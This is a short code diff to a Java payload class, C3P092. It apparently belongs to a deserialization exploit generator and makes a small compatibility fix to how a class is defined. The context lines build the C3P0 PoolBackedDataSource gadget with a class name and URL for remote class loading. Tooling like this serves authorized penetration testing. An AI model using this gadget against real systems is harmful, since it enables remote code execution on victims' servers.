@@ -44,7 +44,9 @@ public class C3P092 implements ObjectPayload<Object> {
         ClassFieldHandler.insertField(ctPoolBackedDataSource, "serialVersionUID", "private static final long serialVersionUID = 7387108436934414104L;");
 
         // mock method name until armed
-        final Class<?> clsPoolBackedDataSource = ctPoolBackedDataSource.toClass(new SuClassLoader());
+        final Class<?> clsPoolBackedDataSource = ctPoolBackedDataSource.toClass(
+                new SuClassLoader(),SuClassLoader.class.getProtectionDomain()
+        );
 
         Object b = Reflections.createWithoutConstructor(clsPoolBackedDataSource);
         Reflections.getField(clsPoolBackedDataSource, "connectionPoolDataSource").set(b, new PoolSource(className, url));
